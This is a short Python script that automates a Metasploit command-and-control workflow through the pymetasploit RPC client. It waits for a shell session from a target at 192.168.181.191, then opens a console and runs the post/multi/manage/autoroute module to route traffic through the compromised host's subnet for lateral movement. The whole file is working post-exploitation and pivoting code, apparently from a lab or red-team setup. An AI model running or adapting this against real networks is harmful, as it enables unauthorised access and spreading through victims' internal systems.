from time import sleep
from c2_settings import MSF_SERVER, MSF_PWD
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, msf_get_timestamp

client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
id = msf_wait_for_session.run(client, '192.168.181.191', meterpreter=False)
shell = client.sessions.session(id)
if(shell is None):
    print("time out, no shell :(")
else:
    print(msf_get_timestamp.run(client, id))
    console = client.consoles.console()
    # console != shell think local-attacker vs target access
    console.write('use post/multi/manage/autoroute')
    console.write('set NETMASK 255.255.255.0')
    console.write('set SESSION {0}'.format(id))
    console.write('set CMD autoadd')
    console.write('run -j')
    pass # for breakpoint